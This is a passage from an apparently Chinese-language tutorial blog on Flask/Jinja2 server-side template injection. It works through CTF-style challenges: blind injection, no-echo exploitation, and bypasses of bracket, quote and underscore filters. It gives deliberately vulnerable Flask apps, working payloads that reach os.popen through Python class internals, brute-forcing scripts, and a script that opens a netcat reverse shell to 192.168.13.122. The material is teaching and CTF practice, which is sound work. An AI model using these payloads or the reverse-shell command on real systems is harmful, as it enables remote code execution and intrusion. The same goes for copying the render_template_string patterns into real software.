class="line">      &#123;% else %&#125;</span><br><span class="line">      &lt;li&gt;&#123;&#123; girl &#125;&#125;&lt;/li&gt;</span><br><span class="line">      &#123;% endif %&#125; &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>然后用下面python代码去渲染他</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show1</span>():</span><br><span class="line">    girls = [<span class="string">&quot;小丽&quot;</span>, <span class="string">&quot;王小丽&quot;</span>, <span class="string">&quot;小红&quot;</span>, <span class="string">&quot;王小红&quot;</span>, <span class="string">&quot;小美&quot;</span>, <span class="string">&quot;小芳&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;luoji.html&quot;</span>, girls=girls)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>返回如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628183423.png"><br>上面是一个简单的使用，如果要利用到刚才的题目中可以尝试一个这样的payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span> <span class="number">2</span>&gt;<span class="number">1</span>%&#125;Test&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
<p>这里会直接显示Test，这里我们就可以尝试一下盲注的思路，回显的方法后面会说，大致思路可以参考下面payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__ %&#125; Test &#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<p>如果Test返回了，那么就说明<code>&#39;&#39;.__class__</code>存在数据，那么我们可以直接尝试下面脚本进行爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;str&quot;</span>: <span class="string">&quot;&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(i)</span><br><span class="line">        + <span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()\&quot;) %&#125;Test&#123;%endif%&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, params=data)</span><br><span class="line">    <span class="comment"># response = requests.post(url, params=data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Test&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>如果有回显，那么说明执行成功，我这里回显</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;str&#x27;</span>: <span class="string">&#x27;&#123;% if \&#x27;\&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[\&#x27;__builtins__\&#x27;][\&#x27;eval\&#x27;](&quot;__import__(\&#x27;os\&#x27;).popen(\&#x27;dir\&#x27;).read()&quot;) %&#125;Test&#123;%endif%&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>提取出的payload如下，尝试之后会发现返回Test</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;) %&#125;Test&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
<p>这个时候可以通过下面payload进行回显数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(&#x27;&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)) %&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628184905.png"></p>
<h1 id="无回显绕过"><a href="#无回显绕过" class="headerlink" title="无回显绕过"></a>无回显绕过</h1><p>无回显绕过题目如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> template:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = render_template_string(template)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一般这种题目三个思路，反弹shell、外带注入(dnslog)、盲注爆破(需要依赖回显)，思路其实都是依赖爆破的形式，例如下面反弹shell的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:5000&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 192.168.13.122 7788 -e /bin/bash&quot;).read() &#125;&#125;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:                                                                           </span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>直接爆破的可以参考双括弧绕过的那个脚本，需要简单修改，根据回显或者时间判断是否对。思路也可以参考sql注入的盲注爆破。例如下面爆破的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;str&quot;</span>: payload&#125;</span><br><span class="line">    response = requests.get(url, params=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;True&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()[<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>]==&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>&#x27;&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            flag += <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Current flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>可以根据情况自行修改脚本。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250630210758.png"></p>
<h1 id="中括号过滤绕过"><a href="#中括号过滤绕过" class="headerlink" title="中括号过滤绕过"></a>中括号过滤绕过</h1><p>getitem是python的一个魔术方法，和之前获取父类的拿一些内容都是一回事，然后getitem的作用是对字典使用时，传入字符串，返回自带你响应键所对应的值，当对列表使用时，传入整数返回列表对应索引值。简单的示例如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = &#123;<span class="string">&quot;1&quot;</span>: <span class="string">&quot;大壮&quot;</span>, <span class="string">&quot;2&quot;</span>: <span class="string">&quot;小明&quot;</span>, <span class="string">&quot;3&quot;</span>: <span class="string">&quot;小红&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>):</span><br><span class="line">        b = <span class="variable language_">self</span>.a[key]</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = test()</span><br><span class="line"><span class="built_in">print</span>(t[<span class="string">&quot;2&quot;</span>])</span><br></pre></td></tr></table></figure>
<p>下面在看一道例题，就是不允许使用中括号，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;[&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&quot;]&quot;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>下面用这个payload会发现出现问题(<code>os._wrap_close办法</code>)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">147</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>出问题的位置是在使用<code>[147]</code>这个索引的地方，这个时候就可以通过<code>__getitem__</code>进行绕过，payload可以修改成下面这样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">147</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>就可以直接运行了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250630213236.png"></p>
<h1 id="单双引号过滤绕过"><a href="#单双引号过滤绕过" class="headerlink" title="单双引号过滤绕过"></a>单双引号过滤绕过</h1><p>简单看一道例题，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这道题目不允许使用单引号和双引号，这种就无法直接通过一个参数进行传参，这种的解决方案就是从外部再次传参，需要传参的位置通过额外的其他方法进行传参，例如使用flask自带的request这个对象来获取其他各种形式的传参，具体比较常用的如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key  <span class="comment"># 获取get传入的key值</span></span><br><span class="line">request.values.x1 <span class="comment"># 所有参数</span></span><br><span class="line">request.cookies   <span class="comment"># 获取cookies传入的值</span></span><br><span class="line">request.headers   <span class="comment"># 获取请求头参数</span></span><br><span class="line">request.<span class="keyword">from</span>.key  <span class="comment"># 获取post传入的参数(type需要等于form的数据)</span></span><br><span class="line">request.data      <span class="comment"># 获取post传入的参数(type需要等于其他的)</span></span><br><span class="line">request.json      <span class="comment"># 获取post传入的json参数(type需要等于json)</span></span><br></pre></td></tr></table></figure>
<p>下面简单利用get传参的形式进行绕过，原本的payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">147</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>采用get传参绕过的形式如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">147</span>).__init__.__globals__.__getitem__(request.args.a).__getitem__(request.args.b)(request.args.c)&#125;&#125;&amp;a=__builtins__&amp;b=<span class="built_in">eval</span>&amp;c=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<h1 id="下划线过滤绕过"><a href="#下划线过滤绕过" class="headerlink" title="下划线过滤绕过"></a>下划线过滤绕过</h1><p>在flask的模板渲染的时候有很多的过滤器，这些先列举一下，然后后面给一个案例使用一下，常用过滤器如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">length()  <span class="comment"># 获取一个序列或者自带你的长度，并返回值</span></span><br><span class="line"><span class="built_in">int</span>()     <span class="comment"># 将值转换为int类型</span></span><br><span class="line"><span class="built_in">float</span>()   <span class="comment"># 将值转换为float类型</span></span><br><span class="line">lower()   <span class="comment"># 将字符串转换为小写</span></span><br><span class="line">upper()   <span class="comment"># 将字符串转换为大写</span></span><br><span class="line">reverse() <span class="comment"># 反转字符串</span></span><br><span class="line">replace(value,old,new) <span class="comment"># 将value中的old替换成new</span></span><br><span class="line"><span class="built_in">list</span>()    <span class="comment"># 将变量转换为列表类型</span></span><br><span class="line">string()  <span class="comment"># 将变量转换成字符串类型</span></span><br><span class="line">join()    <span class="comment"># 将一个序列中的参数值拼接成字符串，通常有python内置的dict()配合使用</span></span><br><span class="line">attr()    <span class="comment"># 获取对象的属性</span></span><br></pre></td></tr></table></figure>
<p>下面看一段代码来简单的使用一下这些过滤器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            upper:&#123;&#123;str|upper&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            upper-lower:&#123;&#123;str|upper|lower&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            attr:&#123;&#123;()|attr(&#x27;__class__&#x27;)&#125;&#125;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str, <span class="built_in">str</span>=<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>过滤器的用法是直接在数据后面套<code>|</code>，然后拼接对应的过滤器，这段代码传入下面payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=ls</span><br></pre></td></tr></table></figure>
<p>返回值如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250701161118.png"><br>好，我们知道过滤的用法之后我们看一道例题，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;_&quot;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>这道题目是不允许传输<code>_</code>这个字符，之前学的payload都是需要用过魔术方法(一般都会有<code>_</code>)进行做攻击的，这里肯定是没有办法，但是可以通过attr+request的方式进行绕过，原始payload如下</p>
